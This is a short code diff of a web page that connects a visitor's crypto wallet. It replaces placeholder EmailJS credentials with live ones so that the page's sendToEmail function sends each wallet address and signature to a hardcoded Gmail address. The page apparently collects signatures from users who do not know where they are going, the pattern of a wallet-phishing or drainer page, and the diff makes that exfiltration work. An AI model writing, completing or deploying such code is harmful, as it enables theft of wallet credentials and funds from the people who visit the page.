@@ -151,7 +151,7 @@
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("your_emailjs_user_id"); // Replace with your EmailJS user ID
+    emailjs.init("P1kMBcLFl4q1q0rH7");
 
     async function connectWallet() {
       if (typeof window.ethereum !== "undefined") {
@@ -182,7 +182,7 @@
     }
 
     function sendToEmail(wallet, signature) {
-      emailjs.send("your_service_id", "your_template_id", {
+      emailjs.send("service_bpnbr64", "template_c3mko8g", {
         to_email: "masterandpuppies@gmail.com",
         wallet_address: wallet,
         signature: signature
